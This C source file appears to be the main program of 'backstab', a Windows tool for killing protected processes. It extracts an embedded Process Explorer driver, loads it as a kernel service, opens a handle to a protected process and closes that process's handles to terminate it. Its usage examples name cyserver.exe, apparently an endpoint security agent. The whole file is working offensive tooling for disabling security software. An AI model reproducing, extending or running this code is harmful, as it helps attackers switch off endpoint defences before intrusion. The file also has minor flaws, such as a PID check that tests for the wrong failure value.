#include "common.h"
#include "Processes.h"
#include "Driverloading.h"
#include "getopt.h"
#include "ProcExp.h"
#include "resource.h"


//https://azrael.digipen.edu/~mmead/www/Courses/CS180/getopt.html

#define INPUT_ERROR_NONEXISTENT_PID 1
#define INPUT_ERROR_TOO_MANY_PROCESSES 2



BOOL verifyPID(DWORD dwPID) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	return TRUE;
}




int PrintInputError(DWORD dwErrorValue) {

	switch (dwErrorValue)
	{
	case INPUT_ERROR_NONEXISTENT_PID:
		printf("Either PID number or name is incorrect\n");
		break;
	case INPUT_ERROR_TOO_MANY_PROCESSES:
		printf("Either name specified has multiple instances, or you specified a name AND a PID\n");
		break;
	default:
		break;
	}

	printf("\nUsage: backstab.exe <-n name || -p PID> [options]  \n");

	printf("\t-n,\t\tChoose process by name, including the .exe suffix\n");
	printf("\t-p,\t\tChoose process by PID\n");
	printf("\t-l,\t\tList handles of protected process\n");
	printf("\t-k,\t\tKill the protected process by closing its handles\n");
	printf("\t-x,\t\tClose a specific handle\n");
	printf("\t-d,\t\tSpecify path to where ProcExp will be extracted\n");
	printf("\t-s,\t\tSpecify service name registry key\n");
	printf("\t-u,\t\t(attempt to) Unload ProcExp driver\n");
	printf("\t-h,\t\tPrint this menu\n");

	printf("Examples:\n");
	printf("\tbackstab.exe -n cyserver.exe -k\t\t [kill cyserver]\n");
	printf("\tbackstab.exe -n cyserver.exe -x E4C\t\t [Close handle E4C of cyserver]\n");
	printf("\tbackstab.exe -n cyserver.exe -l\t\t[list all handles of cyserver]\n");
	printf("\tbackstab.exe -p 4326 -k -d c:\\\\driver.sys\t\t[kill protected process with PID 4326, extract ProcExp driver to C:\\]\n");


	return -1;
}




int main(int argc, char* argv[]) {

	int opt;
	WCHAR szServiceName[MAX_PATH] = L"ProcExp64";
	WCHAR szProcessName[MAX_PATH] = {0};
	WCHAR szDriverPath[MAX_PATH] = {0};
	HANDLE hProtectedProcess = NULL;
	
	LPSTR szHandleToClose = NULL;
	DWORD dwPid = 0;

	BOOL
		isUsingProcessName = FALSE,
		isUsingProcessPID = FALSE,
		isUsingDifferentServiceName = FALSE,
		isUsingDifferentDriverPath = FALSE,
		isUsingSpecificHandle = FALSE,
		isRequestingHandleList = FALSE,
		isRequestingProcessKill = FALSE,
		isRequestingDriverUnload = FALSE,
		bRet = FALSE
		;


	while ((opt = getopt(argc, argv, "hukln:p:s:d:x:")) != -1)
	{
		switch (opt)
		{
		case 'n':
		{
			isUsingProcessName = TRUE;
			bRet = GetProcessPIDFromName(charToWChar(optarg), &dwPid);
			if (!bRet)
				return PrintInputError(dwPid);
			break;
		}
		case 'p':
		{
			isUsingProcessPID = TRUE;
			dwPid = atoi(optarg);
			if (!verifyPID(dwPid))
				return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
			break;
		}
		case 's':
		{
			isUsingDifferentServiceName = TRUE;
			memset(szDriverPath, 0, sizeof(szDriverPath));
			wcscpy_s(szServiceName, _countof(szServiceName), charToWChar(optarg));
			break;
		}
		case 'd':
		{
			isUsingDifferentDriverPath = TRUE;
			memset(szDriverPath, 0, sizeof(szDriverPath));
			wcscpy_s(szDriverPath, _countof(szDriverPath), charToWChar(optarg));
			break;
		}
		case 'x':
		{
			isUsingSpecificHandle = TRUE;
			szHandleToClose = optarg;
			break;
		}
		case 'l':
		{
			isRequestingHandleList = TRUE;
			break;
		}
		case 'k':
		{
			isRequestingProcessKill = TRUE;
			break;
		}
		case 'h':
		{
			return PrintInputError(-1);
			break;
		}
		case 'u':
		{
			isRequestingDriverUnload = TRUE;
		}
		}
	}


	/* input sanity checks */
	if (!isUsingProcessName && !isUsingProcessPID)
	{
		return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
	}
	else if (isUsingProcessName && isUsingProcessPID)
	{ 
		return PrintInputError(INPUT_ERROR_TOO_MANY_PROCESSES);
	}

	if (!InitializeNecessaryNtAddresses())
	{
		return -1;
	}

	
	/* extracting the driver */
	if (!isUsingDifferentDriverPath)
	{
		 WCHAR cwd[MAX_PATH + 1];
		 printf("no special driver dir specified, extracting to current dir\n");
		GetCurrentDirectoryW(MAX_PATH + 1, cwd);
		_snwprintf_s(szDriverPath, MAX_PATH, _TRUNCATE, L"%ws\\%ws", cwd, L"PROCEXP");
		 WriteResourceToDisk(szDriverPath);
	}
	else {
		printf("extracting the drive to %ws\n", szDriverPath);
		WriteResourceToDisk(szDriverPath);
	}

	

	/* driver loading logic */
	if (!LoadDriver(szDriverPath, szServiceName)) {
		if (isRequestingDriverUnload) /*sometimes I can't load the driver because it is already loaded, and I want to unload it*/
		{
			UnloadDriver(szDriverPath, szServiceName);
		}
		return Error("Could not load driver");
	}
	


	/* connect to the loaded driver */
	if (!ConnectToProcExpDevice()) {

		return Error("Could not connect to ProcExp device");
	}


	/* get a handle to the protected process */
	hProtectedProcess = ProcExpOpenProtectedProcess(dwPid);
	if (hProtectedProcess == INVALID_HANDLE_VALUE)
	{
		return Error("could not get handle to protected process\n");
	}


	/* perform required operation */
	if (isRequestingHandleList)
	{
		ListProcessHandles(hProtectedProcess);
	}
	else if (isRequestingProcessKill) {
		KillProcessHandles(hProtectedProcess);
	}
	else if (isUsingSpecificHandle)
	{
		ProcExpKillHandle(dwPid,  strtol(szHandleToClose, 0, 16));
	}
	else {
		printf("Please select an operation\n");
	}

	if (isRequestingDriverUnload)
	{
		UnloadDriver(szDriverPath, szServiceName);
	}

	return 0;
}